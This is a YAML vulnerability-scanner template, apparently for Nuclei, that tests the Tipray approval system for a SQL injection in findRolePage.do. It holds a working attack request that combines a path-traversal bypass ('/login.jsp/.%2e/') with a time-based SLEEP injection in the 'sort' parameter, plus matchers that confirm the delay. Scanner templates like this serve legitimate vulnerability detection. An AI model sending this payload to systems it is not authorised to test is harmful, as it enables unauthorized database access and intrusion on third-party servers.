id: poc-yaml-tipray-gsas-findrolepage-do-sqli
info:
  name: 天锐绿盾审批系统 findRolePage.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"
http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/role/findRolePage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sort=id+OR+(SELECT+1337+FROM+(SELECT(SLEEP({{t1}})))test)&order=asc
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"total\":"
          - "\"role_admin\""
          - "\"role_user\""
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
      - type: dsl
        dsl:
          - "duration >= to_number(t1) && duration <= to_number(t2)"
